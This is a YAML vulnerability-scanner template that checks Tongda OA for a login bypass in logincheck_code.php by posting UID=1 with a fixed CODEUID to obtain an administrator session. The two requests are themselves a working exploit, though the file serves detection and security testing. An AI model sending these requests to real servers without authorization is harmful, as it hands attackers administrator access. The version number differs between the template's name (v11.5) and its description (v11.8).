expression: r0() && r1()
id: tongda-v11-session-disclosure-login-bypass
info:
  author: zan8in
  description: "\u901A\u8FBEOA v11.8 logincheck_code.php\u5B58\u5728\u767B\u9646\u7ED5\
    \u8FC7\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u6F0F\u6D1E\u653B\u51FB\u8005\u53EF\u4EE5\
    \u767B\u9646\u7CFB\u7EDF\u7BA1\u7406\u5458\u540E\u53F0\napp=\"TDXK-\u901A\u8FBE\
    OA\"\n"
  name: "\u901A\u8FBEOA v11.5 logincheck_code.php \u767B\u9646\u7ED5\u8FC7\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20logincheck_code.php%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.headers["content-type"].contains("image/png")
    request:
      method: GET
      path: /general/login_code.php
  r1:
    expression: response.status == 200 && response.body.bcontains(b'"status":')  &&
      response.body.bcontains(b'"msg":') && response.body.bcontains(b'"url":') &&
      response.body.bcontains(b'index.php?isIE=0')
    request:
      body: 'CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1

        '
      method: POST
      path: /logincheck_code.php
